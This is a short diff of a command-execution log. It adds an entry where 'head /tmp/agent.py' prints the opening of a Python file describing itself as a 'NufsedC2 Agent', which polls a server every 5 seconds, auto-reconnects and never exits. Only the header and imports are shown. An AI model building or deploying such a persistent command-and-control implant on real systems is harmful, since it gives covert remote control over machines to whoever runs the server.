@@ -128,3 +128,18 @@ COMMAND TIMEOUT after 30 seconds
 STDOUT: 
 STDERR: 
 ----------------------------------------
+[2026-04-25 12:26:38]
+COMMAND: head /tmp/agent.py
+EXIT CODE: 0
+STDOUT:
+#!/usr/bin/env python3
+"""
+NufsedC2 Agent — RHEL/CentOS Compatible (stdlib only)
+Polls server via HTTPS REST endpoints every 5 seconds.
+Auto-reconnects if server is unreachable. Never exits.
+"""
+
+import os
+import sys
+import ssl
+----------------------------------------
